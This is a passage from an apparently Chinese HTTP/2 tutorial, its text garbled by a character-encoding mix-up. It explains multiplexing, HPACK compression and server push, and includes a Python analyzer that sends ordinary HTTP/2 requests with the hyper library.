class="hljs-number">1.1</span>ï¼ˆéœ€è¦å¤šä¸ªè¿æ¥ï¼‰ï¼š<br>è¿æ¥<span class="hljs-number">1</span>: GET /index<span class="hljs-selector-class">.html</span>  â†’  <span class="hljs-selector-attr">[====å“åº”====]</span><br>è¿æ¥<span class="hljs-number">2</span>: GET /style<span class="hljs-selector-class">.css</span>   â†’       <span class="hljs-selector-attr">[====å“åº”====]</span><br>è¿æ¥<span class="hljs-number">3</span>: GET /script<span class="hljs-selector-class">.js</span>   â†’            <span class="hljs-selector-attr">[====å“åº”====]</span><br>è¿æ¥<span class="hljs-number">4</span>: GET /<span class="hljs-selector-tag">image</span><span class="hljs-selector-class">.png</span>   â†’                 <span class="hljs-selector-attr">[====å“åº”====]</span><br><br>é—®é¢˜ï¼š<br>- éœ€è¦å»ºç«‹å¤šä¸ªTCPè¿æ¥<br>- æ¯ä¸ªè¿æ¥çš„æ¡æ‰‹å¼€é”€<br>- è¿æ¥æ•°å—é™åˆ¶<br><br>HTTP/<span class="hljs-number">2</span>ï¼ˆå•ä¸ªè¿æ¥ï¼Œå¤šä¸ªæµï¼‰ï¼š<br>å•ä¸ªTCPè¿æ¥:<br>  æµ<span class="hljs-number">1</span>: GET /index<span class="hljs-selector-class">.html</span>  â†’  <span class="hljs-selector-attr">[==å“åº”==]</span><br>  æµ<span class="hljs-number">3</span>: GET /style<span class="hljs-selector-class">.css</span>   â†’    <span class="hljs-selector-attr">[==å“åº”==]</span><br>  æµ<span class="hljs-number">5</span>: GET /script<span class="hljs-selector-class">.js</span>   â†’  <span class="hljs-selector-attr">[==å“åº”==]</span><br>  æµ<span class="hljs-number">7</span>: GET /<span class="hljs-selector-tag">image</span><span class="hljs-selector-class">.png</span>   â†’      <span class="hljs-selector-attr">[==å“åº”==]</span><br><br>ä¼˜åŠ¿ï¼š<br>- åªéœ€ä¸€ä¸ªTCPè¿æ¥<br>- å‡å°‘è¿æ¥å¼€é”€<br>- å¹¶è¡Œä¼ è¾“å¤šä¸ªèµ„æº<br>- é¿å…é˜Ÿå¤´é˜»å¡<br><br>æµçš„æ¦‚å¿µï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å•ä¸ªHTTP/<span class="hljs-number">2</span>è¿æ¥                          â”‚<br>â”‚  â”œâ”€ æµ<span class="hljs-number">1</span> (Stream <span class="hljs-number">1</span>)                      â”‚<br>â”‚  â”‚   â”œâ”€ HEADERS å¸§                      â”‚<br>â”‚  â”‚   â”œâ”€ DATA å¸§ <span class="hljs-number">1</span>                       â”‚<br>â”‚  â”‚   â””â”€ DATA å¸§ <span class="hljs-number">2</span>                       â”‚<br>â”‚  â”œâ”€ æµ<span class="hljs-number">3</span> (Stream <span class="hljs-number">3</span>)                      â”‚<br>â”‚  â”‚   â”œâ”€ HEADERS å¸§                      â”‚<br>â”‚  â”‚   â””â”€ DATA å¸§                         â”‚<br>â”‚  â””â”€ æµ<span class="hljs-number">5</span> (Stream <span class="hljs-number">5</span>)                      â”‚<br>â”‚      â””â”€ HEADERS å¸§                      â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æµçš„ç”Ÿå‘½å‘¨æœŸï¼š<br>idle â†’ open â†’ half-closed â†’ closed<br></code></pre></td></tr></table></figure><h3 id="2-4-å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰"><a href="#2-4-å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰" class="headerlink" title="2.4 å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰"></a>2.4 å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HPACKå‹ç¼©åŸç†ï¼š<br><br>1. é™æ€è¡¨ï¼ˆé¢„å®šä¹‰çš„å¸¸ç”¨å¤´éƒ¨ï¼‰<br>â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç´¢å¼•â”‚  å¤´éƒ¨åç§°        â”‚  å€¼              â”‚<br>â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  1  â”‚ :authority       â”‚                 â”‚<br>â”‚  2  â”‚ :method          â”‚ GET             â”‚<br>â”‚  3  â”‚ :method          â”‚ POST            â”‚<br>â”‚  4  â”‚ :path            â”‚ /               â”‚<br>â”‚  5  â”‚ :path            â”‚ /index.html     â”‚<br>â”‚  6  â”‚ :scheme          â”‚ http            â”‚<br>â”‚  7  â”‚ :scheme          â”‚ https           â”‚<br>â”‚  8  â”‚ :status          â”‚ 200             â”‚<br>â”‚ ... â”‚ ...              â”‚ ...             â”‚<br>â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>2. åŠ¨æ€è¡¨ï¼ˆè¿æ¥æœŸé—´å»ºç«‹çš„è¡¨ï¼‰<br><span class="hljs-code">   - è®°å½•å·²å‘é€çš„å¤´éƒ¨</span><br><span class="hljs-code">   - åç»­åªå‘é€ç´¢å¼•</span><br><span class="hljs-code">   - å¤§å¹…å‡å°‘é‡å¤æ•°æ®</span><br><br>ç¤ºä¾‹ï¼š<br>ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼š<br><span class="hljs-meta">:method:</span> GET<br><span class="hljs-meta">:path:</span> /index.html<br><span class="hljs-meta">:scheme:</span> https<br>user-agent: Mozilla/5.0...<br>cookie: session=abc123...<br><br>ç¬¬äºŒä¸ªè¯·æ±‚ï¼ˆå‹ç¼©åï¼‰ï¼š<br><span class="hljs-meta">:method:</span> GET          â†’ ç´¢å¼•2ï¼ˆä»é™æ€è¡¨ï¼‰<br><span class="hljs-meta">:path:</span> /style.css     â†’ æ–°å€¼<br><span class="hljs-meta">:scheme:</span> https        â†’ ç´¢å¼•7ï¼ˆä»é™æ€è¡¨ï¼‰<br>user-agent: ...       â†’ ç´¢å¼•62ï¼ˆä»åŠ¨æ€è¡¨ï¼‰<br>cookie: ...           â†’ ç´¢å¼•63ï¼ˆä»åŠ¨æ€è¡¨ï¼‰<br><br>å‹ç¼©æ•ˆæœï¼š<br><span class="hljs-bullet">- </span>é¦–æ¬¡è¯·æ±‚ï¼š500å­—èŠ‚<br><span class="hljs-bullet">- </span>åç»­è¯·æ±‚ï¼š50å­—èŠ‚<br><span class="hljs-bullet">- </span>å‹ç¼©ç‡ï¼š90%<br></code></pre></td></tr></table></figure><h3 id="2-5-æœåŠ¡å™¨æ¨é€"><a href="#2-5-æœåŠ¡å™¨æ¨é€" class="headerlink" title="2.5 æœåŠ¡å™¨æ¨é€"></a>2.5 æœåŠ¡å™¨æ¨é€</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">æœåŠ¡å™¨æ¨é€æµç¨‹ï¼š<br><br>ä¼ ç»ŸHTTP/<span class="hljs-number">1.1</span>ï¼š<br>å®¢æˆ·ç«¯: GET /<span class="hljs-keyword">index</span>.html<br>æœåŠ¡å™¨: â†’ è¿”å›<span class="hljs-keyword">index</span>.html<br>å®¢æˆ·ç«¯: (è§£æHTMLï¼Œå‘ç°éœ€è¦style.css)<br>å®¢æˆ·ç«¯: GET /style.css<br>æœåŠ¡å™¨: â†’ è¿”å›style.css<br>å®¢æˆ·ç«¯: (è§£æHTMLï¼Œå‘ç°éœ€è¦script.js)<br>å®¢æˆ·ç«¯: GET /script.js<br>æœåŠ¡å™¨: â†’ è¿”å›script.js<br><br>æ€»å¾€è¿”æ¬¡æ•°ï¼š<span class="hljs-number">6</span>æ¬¡ï¼ˆ<span class="hljs-number">3</span>ä¸ªè¯·æ±‚-å“åº”ï¼‰<br><br>HTTP/<span class="hljs-number">2</span>æœåŠ¡å™¨æ¨é€ï¼š<br>å®¢æˆ·ç«¯: GET /<span class="hljs-keyword">index</span>.html<br>æœåŠ¡å™¨: â†’ PUSH_PROMISE /style.css<br>æœåŠ¡å™¨: â†’ PUSH_PROMISE /script.js<br>æœåŠ¡å™¨: â†’ è¿”å›<span class="hljs-keyword">index</span>.html<br>æœåŠ¡å™¨: â†’ è¿”å›style.css (æ¨é€)<br>æœåŠ¡å™¨: â†’ è¿”å›script.js (æ¨é€)<br><br>æ€»å¾€è¿”æ¬¡æ•°ï¼š<span class="hljs-number">2</span>æ¬¡ï¼ˆ<span class="hljs-number">1</span>ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸»åŠ¨æ¨é€å…¶ä»–èµ„æºï¼‰<br><br>æ¨é€ç¤ºä¾‹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å®¢æˆ·ç«¯è¯·æ±‚                             â”‚<br>â”‚  GET /<span class="hljs-keyword">index</span>.html HTTP/<span class="hljs-number">2</span>                â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>         â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  æœåŠ¡å™¨å“åº”                             â”‚<br>â”‚  <span class="hljs-number">1</span>. PUSH_PROMISE                       â”‚<br>â”‚     :<span class="hljs-keyword">method</span>: GET                       â”‚<br>â”‚     :path: /style.css                  â”‚<br>â”‚                                        â”‚<br>â”‚  <span class="hljs-number">2</span>. HEADERS (<span class="hljs-keyword">index</span>.htmlçš„å“åº”å¤´)       â”‚<br>â”‚  <span class="hljs-number">3</span>. DATA (<span class="hljs-keyword">index</span>.htmlçš„å†…å®¹)            â”‚<br>â”‚                                        â”‚<br>â”‚  <span class="hljs-number">4</span>. HEADERS (style.cssçš„å“åº”å¤´)        â”‚<br>â”‚  <span class="hljs-number">5</span>. DATA (style.cssçš„å†…å®¹ - æ¨é€)      â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="3-å®æˆ˜é¡¹ç›®ï¼šHTTP-2å®¢æˆ·ç«¯åˆ†æå™¨"><a href="#3-å®æˆ˜é¡¹ç›®ï¼šHTTP-2å®¢æˆ·ç«¯åˆ†æå™¨" class="headerlink" title="3. å®æˆ˜é¡¹ç›®ï¼šHTTP&#x2F;2å®¢æˆ·ç«¯åˆ†æå™¨"></a>3. å®æˆ˜é¡¹ç›®ï¼šHTTP&#x2F;2å®¢æˆ·ç«¯åˆ†æå™¨</h2><h3 id="3-1-é¡¹ç›®éœ€æ±‚"><a href="#3-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="3.1 é¡¹ç›®éœ€æ±‚"></a>3.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½ï¼š<br><span class="hljs-bullet">1.</span> å‘é€HTTP/2è¯·æ±‚<br><span class="hljs-bullet">2.</span> åˆ†æHTTP/2å¸§ç»“æ„<br><span class="hljs-bullet">3.</span> å¯¹æ¯”HTTP/1.1å’ŒHTTP/2æ€§èƒ½<br><span class="hljs-bullet">4.</span> å±•ç¤ºå¤šè·¯å¤ç”¨æ•ˆæœ<br></code></pre></td></tr></table></figure><h3 id="3-2-ä»£ç å®ç°"><a href="#3-2-ä»£ç å®ç°" class="headerlink" title="3.2 ä»£ç å®ç°"></a>3.2 ä»£ç å®ç°</h3><pre><code class="language-python"># day28_http2_analyzer.py# åŠŸèƒ½ï¼šHTTP/2åè®®åˆ†æå™¨import sslimport socketfrom typing import Dict, List, Tupleimport time# æ³¨æ„ï¼šéœ€è¦å®‰è£… hyper åº“æ¥å¤„ç†HTTP/2# pip install hypertry:    from hyper import HTTPConnection    from hyper.common.headers import HTTPHeaderMapexcept ImportError:    print(&quot;è¯·å…ˆå®‰è£…hyperåº“: pip install hyper&quot;)    exit(1)class HTTP2Analyzer:    &quot;&quot;&quot;    HTTP/2åè®®åˆ†æå™¨    åŠŸèƒ½ï¼š        1. å‘é€HTTP/2è¯·æ±‚        2. åˆ†æå“åº”æ€§èƒ½        3. å¯¹æ¯”HTTP/1.1å’ŒHTTP/2        4. æ¼”ç¤ºå¤šè·¯å¤ç”¨    &quot;&quot;&quot;    def __init__(self, host: str, port: int = 443):        &quot;&quot;&quot;        åˆå§‹åŒ–HTTP/2è¿æ¥        å‚æ•°ï¼š            host: ç›®æ ‡ä¸»æœº            port: ç«¯å£ï¼ˆé»˜è®¤443 for HTTPSï¼‰        &quot;&quot;&quot;        self.host = host        self.port = port        self.conn = None    def connect(self):        &quot;&quot;&quot;        å»ºç«‹HTTP/2è¿æ¥        å·¥ä½œåŸç†ï¼š            1. åˆ›å»ºSSL/TLSè¿æ¥            2. é€šè¿‡ALPNåå•†HTTP/2            3. å»ºç«‹HTTP/2è¿æ¥        &quot;&quot;&quot;        try:            print(f&quot;\næ­£åœ¨è¿æ¥åˆ° {self.host}:{self.port}...&quot;)            self.conn = HTTPConnection(self.host, self.port)            print(&quot;âœ… HTTP/2è¿æ¥å»ºç«‹æˆåŠŸ&quot;)            return True        except Exception as e:            print(f&quot;âŒ è¿æ¥å¤±è´¥: {e}&quot;)            return False    def request_single(self, path: str = &#39;/&#39;) -&gt; Tuple[float, int]:        &quot;&quot;&quot;        å‘é€å•ä¸ªHTTP/2è¯·æ±‚        å‚æ•°ï¼š            path: è¯·æ±‚è·¯å¾„        è¿”å›å€¼ï¼š            (å“åº”æ—¶é—´, å“åº”å¤§å°)        &quot;&quot;&quot;        try:            start_time = time.time()            # å‘é€GETè¯·æ±‚            stream_id = self.conn.request(&#39;GET&#39;, path)            # è·å–å“åº”            response = self.conn.get_response(stream_id)            # è¯»å–å“åº”ä½“            body = response.read()            end_time = time.time()            elapsed = (end_time - start_time) * 1000  # è½¬æ¢ä¸ºæ¯«ç§’            print(f&quot;  {path}&quot;)            print(f&quot;    çŠ¶æ€ç : {response.status}&quot;)            print(f&quot;    å“åº”æ—¶é—´: {elapsed:.2f}ms&quot;)            print(f&quot;    å“åº”å¤§å°: {len(body)} bytes&quot;)            return elapsed, len(body)        except Exception as e:            print(f&quot;  âŒ è¯·æ±‚å¤±è´¥: {e}&quot;)            return 0, 0    def request_multiple(self, paths: List[str]) -&gt; Dict[str, Tuple[float, int]]:        &quot;&quot;&quot;        å¹¶å‘å‘é€å¤šä¸ªHTTP/2è¯·æ±‚ï¼ˆæ¼”ç¤ºå¤šè·¯å¤ç”¨ï¼‰        å‚æ•°ï¼š            paths: è·¯å¾„åˆ—è¡¨        è¿”å›å€¼ï¼š            {è·¯å¾„: (å“åº”æ—¶é—´, å“åº”å¤§å°)}        å·¥ä½œåŸç†ï¼š            HTTP/2å…è®¸åœ¨å•ä¸ªè¿æ¥ä¸Šå¹¶å‘å¤šä¸ªè¯·æ±‚            ä¸éœ€è¦ç­‰å¾…å‰ä¸€ä¸ªè¯·æ±‚å®Œæˆ        &quot;&quot;&quot;        results = {}        stream_ids = {}        print(f&quot;\næ­£åœ¨å¹¶å‘è¯·æ±‚ {len(paths)} ä¸ªèµ„æº...&quot;)        # ç¬¬ä¸€æ­¥ï¼šå‘é€æ‰€æœ‰è¯·æ±‚ï¼ˆä¸ç­‰å¾…å“åº”ï¼‰        start_time = time.time()        for path in paths:            try:                stream_id = self.conn.request(&#39;GET&#39;, path)                stream_ids[stream_id] = path                print(f&quot;  å‘é€è¯·æ±‚: {path} (æµID: {stream_id})&quot;)            except Exception as e:                print(f&quot;  âŒ å‘é€è¯·æ±‚å¤±è´¥ {path}: {e}&quot;)        # ç¬¬äºŒæ­¥ï¼šæ¥æ”¶æ‰€æœ‰å“åº”        for stream_id, path in stream_ids.items():            try:                response = self.conn.get_response(stream_id)                body = response.read()                elapsed = (time.time() - start_time) * 1000                results[path] = (elapsed, len(body))                print(f&quot;  æ¥æ”¶å“åº”: {path}&quot;)                print(f&quot;    çŠ¶æ€ç : {response.status}&quot;)                print(f&quot;    å¤§å°: {len(body)} bytes&quot;)            except Exception as e:                print(f&quot;  âŒ æ¥æ”¶å“åº”å¤±è´¥ {path}: {e}&quot;)                results[path] = (0, 0)        total_time = (time.time() - start_time) * 1000        print(f&quot;\næ€»è€—æ—¶: {total_time:.2f}ms&quot;)        return results    def analyze_headers(self):        &quot;&quot;&quot;        åˆ†æHTTP/2å¤´éƒ¨å‹ç¼©æ•ˆæœ        æ¼”ç¤ºï¼š            å‘é€å¤šä¸ªè¯·æ±‚ï¼Œè§‚å¯Ÿå¤´éƒ¨å‹ç¼©å¸¦æ¥çš„æ€§èƒ½æå‡        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/2å¤´éƒ¨å‹ç¼©åˆ†æ&quot;)        print(&quot;=&quot;*60)        paths = [&#39;/&#39;, &#39;/about&#39;, &#39;/contact&#39;]        for i, path in enumerate(paths, 1):            print(f&quot;\nè¯·æ±‚ {i}: {path}&quot;)            self.request_single(path)        print(&quot;&quot;&quot;å¤´éƒ¨å‹ç¼©è¯´æ˜ï¼š- ç¬¬ä¸€ä¸ªè¯·æ±‚å‘é€å®Œæ•´å¤´éƒ¨- åç»­è¯·æ±‚åªå‘é€å¤´éƒ¨ç´¢å¼•- HPACKç®—æ³•å‹ç¼©ç‡å¯è¾¾90%        &quot;&quot;&quot;)    def compare_http_versions(self):        &quot;&quot;&quot;        å¯¹æ¯”HTTP/1.1å’ŒHTTP/2æ€§èƒ½        è¯´æ˜ï¼š            è¿™æ˜¯ä¸€ä¸ªç®€åŒ–çš„å¯¹æ¯”æ¼”ç¤º            å®é™…æ€§èƒ½å·®å¼‚éœ€è¦çœŸå®ç¯å¢ƒæµ‹è¯•        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/1.1 vs HTTP/2 æ€§èƒ½å¯¹æ¯”&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;å‡è®¾åœºæ™¯ï¼šåŠ è½½ä¸€ä¸ªç½‘é¡µï¼ŒåŒ…å«ï¼š- 1ä¸ªHTMLæ–‡ä»¶- 3ä¸ªCSSæ–‡ä»¶- 5ä¸ªJSæ–‡ä»¶- 10ä¸ªå›¾ç‰‡æ–‡ä»¶å…±19ä¸ªèµ„æºHTTP/1.1ï¼ˆ6ä¸ªå¹¶å‘è¿æ¥ï¼‰ï¼šâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ è¿æ¥1: [HTML]                          â”‚â”‚ è¿æ¥2: [CSS1][CSS2][CSS3]              â”‚â”‚ è¿æ¥3: [JS1][JS2]                      â”‚â”‚ è¿æ¥4: [JS3][JS4][JS5]                 â”‚â”‚ è¿æ¥5: [IMG1][IMG2][IMG3][IMG4]        â”‚â”‚ è¿æ¥6: [IMG5][IMG6][IMG7][IMG8]        â”‚â”‚ ç­‰å¾…é˜Ÿåˆ—: [IMG9][IMG10]                â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜æ€»è€—æ—¶ï¼šçº¦800msï¼ˆä¼°ç®—ï¼‰- 6ä¸ªTCPè¿æ¥å»ºç«‹ï¼š6 Ã— 100ms = 600ms- èµ„æºä¸‹è½½ï¼š200msHTTP/2ï¼ˆå•ä¸ªè¿æ¥ï¼Œå¤šè·¯å¤ç”¨ï¼‰ï¼šâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ å•ä¸ªè¿æ¥:                               â”‚â”‚ [HTML][CSS1][CSS2][CSS3][JS1][JS2]...  â”‚â”‚ æ‰€æœ‰19ä¸ªèµ„æºå¹¶è¡Œä¼ è¾“                    â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜æ€»è€—æ—¶ï¼šçº¦150msï¼ˆä¼°ç®—ï¼‰- 1ä¸ªTCPè¿æ¥å»ºç«‹ï¼š100ms- èµ„æºä¸‹è½½ï¼ˆå¹¶è¡Œï¼‰ï¼š50msæ€§èƒ½æå‡ï¼š(800-150)/800 = 81.25%        &quot;&quot;&quot;)    def demonstrate_multiplexing(self):        &quot;&quot;&quot;        æ¼”ç¤ºå¤šè·¯å¤ç”¨        å·¥ä½œåŸç†ï¼š            åœ¨å•ä¸ªTCPè¿æ¥ä¸Šï¼ŒåŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚            ä¸éœ€è¦ç­‰å¾…å‰ä¸€ä¸ªè¯·æ±‚å®Œæˆ        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; å¤šè·¯å¤ç”¨æ¼”ç¤º&quot;)        print(&quot;=&quot;*60)        # æ¨¡æ‹Ÿè¯·æ±‚å¤šä¸ªèµ„æº        paths = [            &#39;/&#39;,            &#39;/favicon.ico&#39;,            &#39;/robots.txt&#39;        ]        print(&quot;\næ–¹å¼1ï¼šé¡ºåºè¯·æ±‚ï¼ˆæ¨¡æ‹ŸHTTP/1.1ï¼‰&quot;)        print(&quot;-&quot; * 60)        total_sequential = 0        for path in paths:            elapsed, size = self.request_single(path)            total_sequential += elapsed        print(f&quot;\né¡ºåºè¯·æ±‚æ€»è€—æ—¶: {total_sequential:.2f}ms&quot;)        # é‡æ–°è¿æ¥        self.connect()        print(&quot;\næ–¹å¼2ï¼šå¹¶å‘è¯·æ±‚ï¼ˆHTTP/2å¤šè·¯å¤ç”¨ï¼‰&quot;)        print(&quot;-&quot; * 60)        results = self.request_multiple(paths)        print(f&quot;&quot;&quot;å¯¹æ¯”ç»“æœï¼š- é¡ºåºè¯·æ±‚: {total_sequential:.2f}ms- å¹¶å‘è¯·æ±‚: {max(r[0] for r in results.values()):.2f}ms- æ€§èƒ½æå‡: {(1 - max(r[0] for r in results.values())/total_sequential)*100:.1f}%è¯´æ˜ï¼šHTTP/2å¤šè·¯å¤ç”¨å…è®¸å¤šä¸ªè¯·æ±‚/å“åº”å¹¶è¡Œä¼ è¾“      é¿å…äº†é˜Ÿå¤´é˜»å¡ï¼Œæ˜¾è‘—æå‡æ€§èƒ½        &quot;&quot;&quot;)    def close(self):        &quot;&quot;&quot;å…³é—­è¿æ¥&quot;&quot;&quot;        if self.conn:            self.conn.close()            print(&quot;\nè¿æ¥å·²å…³é—­&quot;)class SimpleHTTP2Demo:    &quot;&quot;&quot;    ç®€åŒ–çš„HTTP/2æ¦‚å¿µæ¼”ç¤º    ï¼ˆä¸ä¾èµ–å¤–éƒ¨åº“ï¼Œçº¯Pythonå®ç°æ¦‚å¿µæ¼”ç¤ºï¼‰    &quot;&quot;&quot;    @staticmethod    def show_frame_structure():        &quot;&quot;&quot;        å±•ç¤ºHTTP/2å¸§ç»“æ„        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/2å¸§ç»“æ„æ¼”ç¤º&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;HTTP/2å¸§æ ¼å¼ï¼šâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚  +-----------------------------------------------+   â”‚â”‚  |                 Length (24)                   |   â”‚â”‚  +---------------+---------------+---------------+   â”‚â”‚  |   Type (8)    |   Flags (8)   |                   â”‚â”‚  +-+-------------+---------------+------...------+   â”‚â”‚  |R|                 Stream ID (31)               |   â”‚â”‚  +=+===========================================+   â”‚â”‚  |                   Frame Payload               |   â”‚â”‚  +-----------------------------------------------+   â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜å­—æ®µè¯´æ˜ï¼š- Length: 24ä½ï¼Œå¸§è´Ÿè½½çš„é•¿åº¦- Type: 8ä½ï¼Œå¸§ç±»å‹  * 0x0: DATA  * 0x1: HEADERS  * 0x2: PRIORITY  * 0x3: RST_STREAM  * 0x4: SETTINGS  * 0x5: PUSH_PROMISE  * 0x6: PING  * 0x7: GOAWAY  * 0x8: WINDOW_UPDATE  * 0x9: CONTINUATION- Flags: 8ä½ï¼Œç‰¹å®šäºå¸§ç±»å‹çš„æ ‡å¿—- R: 1ä½ï¼Œä¿ç•™ä½- Stream ID: 31ä½ï¼Œæµæ ‡è¯†ç¬¦ç¤ºä¾‹å¸§ï¼ˆHEADERSå¸§ï¼‰ï¼šâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ Length: 0x000012 (18å­—èŠ‚)            â”‚â”‚ Type: 0x01 (HEADERS)                 â”‚â”‚ Flags: 0x04 (END_HEADERS)            â”‚â”‚ Stream ID: 0x00000001                â”‚â”‚ Payload: (å‹ç¼©çš„å¤´éƒ¨æ•°æ®)            